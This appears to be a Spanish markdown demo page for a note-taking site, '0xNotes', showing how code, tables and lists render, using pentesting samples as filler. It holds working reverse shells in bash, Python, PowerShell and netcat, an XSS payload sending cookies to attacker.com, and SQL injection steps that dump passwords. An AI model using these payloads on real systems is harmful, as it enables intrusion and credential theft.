# 馃帹 Ejemplos Visuales del Dise帽o

Este documento muestra ejemplos de todos los elementos de dise帽o implementados en 0xNotes.

## Encabezados

# H1 - T铆tulo Principal en Verde Ne贸n

## H2 - Subt铆tulo con Borde Verde

### H3 - Tercer Nivel

#### H4 - Cuarto Nivel

---

## Texto y Formato

Este es un p谩rrafo normal con texto regular. Puedes incluir **texto en negrita** y *texto en cursiva*. Tambi茅n puedes combinarlos: ***negrita y cursiva***.

Aqu铆 hay un enlace de ejemplo: [GitHub](https://github.com)

---

## C贸digo

### C贸digo Inline

Usa el comando `ls -la` para listar archivos, o ejecuta `nmap -sV 192.168.1.1` para escanear.

Instala paquetes con `pip install requests` o `npm install express`.

### Bloques de C贸digo

#### Bash

```bash
# Escaneo de puertos con Nmap
nmap -sC -sV -p- 192.168.1.100

# Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Buscar archivos SUID
find / -perm -u=s -type f 2>/dev/null
```

#### Python

```python
import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    
    s.close()

# Uso
reverse_shell('10.0.0.1', 4444)
```

#### JavaScript

```javascript
// XSS Payload
function stealCookies() {
    const cookies = document.cookie;
    const img = new Image();
    img.src = `http://attacker.com/steal?cookie=${cookies}`;
}

// Fetch API
fetch('http://api.example.com/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        username: 'admin',
        password: 'password123'
    })
});
```

#### SQL

```sql
-- SQL Injection Union-based
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password, email FROM users--

-- Extraer informaci贸n de la base de datos
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema = database();

-- Dump de usuarios
SELECT username, password 
FROM users 
WHERE admin = 1;
```

#### PowerShell

```powershell
# Informaci贸n del sistema
Get-ComputerInfo
systeminfo

# Usuarios administradores
Get-LocalGroupMember -Group "Administrators"

# Procesos en ejecuci贸n
Get-Process | Where-Object {$_.CPU -gt 100}

# Reverse shell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
```

---

## Listas

### Lista Desordenada

- Reconocimiento
- Enumeraci贸n
  - Escaneo de puertos
  - Identificaci贸n de servicios
  - B煤squeda de vulnerabilidades
- Explotaci贸n
  - SQL Injection
  - XSS
  - CSRF
- Post-explotaci贸n
  - Escalada de privilegios
  - Persistencia
  - Exfiltraci贸n

### Lista Ordenada

1. Configurar el entorno
2. Realizar reconocimiento pasivo
3. Escanear la red objetivo
4. Enumerar servicios
5. Identificar vulnerabilidades
6. Desarrollar exploit
7. Ejecutar ataque
8. Obtener acceso
9. Escalar privilegios
10. Documentar hallazgos

### Lista de Tareas

- [x] Instalar Kali Linux
- [x] Configurar Burp Suite
- [x] Aprender Nmap
- [ ] Completar OSCP
- [ ] Obtener certificaci贸n CEH
- [ ] Practicar en HackTheBox

---

## Tablas

### Tabla Simple

| Herramienta | Categor铆a | Uso Principal |
|-------------|-----------|---------------|
| Nmap | Reconocimiento | Escaneo de puertos |
| Metasploit | Explotaci贸n | Framework de exploits |
| Burp Suite | Web Testing | Proxy interceptor |
| Wireshark | Network Analysis | An谩lisis de tr谩fico |
| John the Ripper | Password Cracking | Crackeo de hashes |

### Tabla de Comandos

| Comando | Descripci贸n | Ejemplo |
|---------|-------------|---------|
| `nmap` | Escaneo de red | `nmap -sV target.com` |
| `sqlmap` | SQL Injection | `sqlmap -u "url" --dbs` |
| `hydra` | Brute force | `hydra -L users.txt -P pass.txt ssh://target` |
| `gobuster` | Directory brute forcing | `gobuster dir -u url -w wordlist.txt` |
| `nikto` | Web scanner | `nikto -h target.com` |

### Tabla de Puertos

| Puerto | Servicio | Protocolo | Notas |
|--------|----------|-----------|-------|
| 21 | FTP | TCP | File Transfer Protocol |
| 22 | SSH | TCP | Secure Shell |
| 80 | HTTP | TCP | Web sin cifrar |
| 443 | HTTPS | TCP | Web cifrado |
| 445 | SMB | TCP | Compartici贸n de archivos Windows |
| 3306 | MySQL | TCP | Base de datos MySQL |
| 3389 | RDP | TCP | Remote Desktop Protocol |

---

## Blockquotes y Alertas

> Este es un blockquote simple con informaci贸n adicional.
> Puede contener m煤ltiples l铆neas.

> **NOTA**: Los blockquotes con **palabras en negrita** se resaltan en verde.

> **IMPORTANTE**: Siempre obt茅n autorizaci贸n por escrito antes de realizar pruebas de penetraci贸n.

> **TIP**: Usa `--help` para ver todas las opciones de una herramienta.

> **WARNING**: Este exploit puede causar denegaci贸n de servicio. 脷salo con precauci贸n.

> **DANGER**: Ejecutar este comando puede da帽ar el sistema. Solo para entornos de prueba.

---

## Enlaces

Enlaces normales: [OWASP](https://owasp.org/) | [HackTheBox](https://hackthebox.com/) | [TryHackMe](https://tryhackme.com/)

Enlaces con c贸digo: Visita [`https://github.com`](https://github.com) para ver el c贸digo.

---

## Separadores

Puedes usar l铆neas horizontales para separar secciones:

---

***

---

## Im谩genes

Las im谩genes se ver铆an as铆 (ejemplo):

![Logo Example](https://via.placeholder.com/600x200/2d3748/00ff88?text=0xNotes)

---

## Combinaciones

### C贸digo con explicaci贸n

Para obtener una reverse shell en Linux:

```bash
# M茅todo 1: Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# M茅todo 2: Netcat
nc -e /bin/sh ATTACKER_IP PORT

# M茅todo 3: Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> **IMPORTANTE**: Reemplaza `ATTACKER_IP` y `PORT` con tus valores reales.

### Tabla con comandos inline

| Acci贸n | Comando |
|--------|---------|
| Escaneo b谩sico | `nmap target.com` |
| Escaneo completo | `nmap -A -p- target.com` |
| Detectar OS | `nmap -O target.com` |
| Scripts NSE | `nmap --script vuln target.com` |

### Lista con c贸digo

Pasos para explotar SQL Injection:

1. Detectar vulnerabilidad: `' OR '1'='1`
2. Encontrar columnas: `' UNION SELECT NULL--`
3. Identificar DB: `' UNION SELECT @@version--`
4. Extraer tablas: `' UNION SELECT table_name FROM information_schema.tables--`
5. Dump datos: `' UNION SELECT username,password FROM users--`

---

## Emojis y S铆mbolos

### Emojis Comunes

馃攼 Seguridad | 馃寪 Web | 馃敡 Herramientas | 馃捇 Sistemas | 馃摑 Notas | 馃殌 R谩pido | 鈿?Eficiente | 馃幆 Objetivo | 鉁?Completado | 鉂?Error | 鈿狅笍 Advertencia | 馃挕 Idea | 馃摎 Recursos | 馃弳 Logro | 馃攳 B煤squeda | 馃洝锔?Protecci贸n

### S铆mbolos T茅cnicos

鈫?鈫?鈫?鈫?鈬?鈬?鈬?鈬?鈥?鈼?鈼?鈼?鈻?鈻?鈻?鈼?鈻?鈻?鈽?鈽?鉁?鉁?鈭?鈮?鈮?鈮?鈮?卤 脳 梅 鈭?

---

## Texto Especial

### C贸digo Multilenguaje

Ejemplo de implementaci贸n en varios lenguajes:

**Python:**
```python
print("Hello, World!")
```

**JavaScript:**
```javascript
console.log("Hello, World!");
```

**Bash:**
```bash
echo "Hello, World!"
```

**PHP:**
```php
<?php echo "Hello, World!"; ?>
```

---

## Checklist Completa

- [x] Dise帽o responsivo
- [x] Modo claro/oscuro
- [x] Syntax highlighting
- [x] B煤squeda integrada
- [x] Navegaci贸n por teclado
- [x] Copy-to-clipboard
- [x] Paginaci贸n
- [x] Sidebar colapsable
- [x] Enlaces internos
- [x] Tablas responsivas
- [x] C贸digo optimizado
- [x] Paleta de colores profesional
- [x] Transiciones suaves
- [x] Accesibilidad mejorada
- [x] Performance optimizado

---

## Resumen Visual

Este documento muestra:

1. 鉁?**Encabezados** con diferentes niveles y estilos
2. 鉁?**C贸digo inline** resaltado en verde
3. 鉁?**Bloques de c贸digo** con m煤ltiples lenguajes
4. 鉁?**Tablas** con borders y hover effects
5. 鉁?**Listas** ordenadas, desordenadas y de tareas
6. 鉁?**Blockquotes** con destacados
7. 鉁?**Enlaces** con estilo verde
8. 鉁?**Emojis** y s铆mbolos
9. 鉁?**Combinaciones** de elementos

---

**Prueba el toggle de tema (馃寵/鈽€锔? en la esquina inferior derecha para ver c贸mo cambian todos estos elementos!**
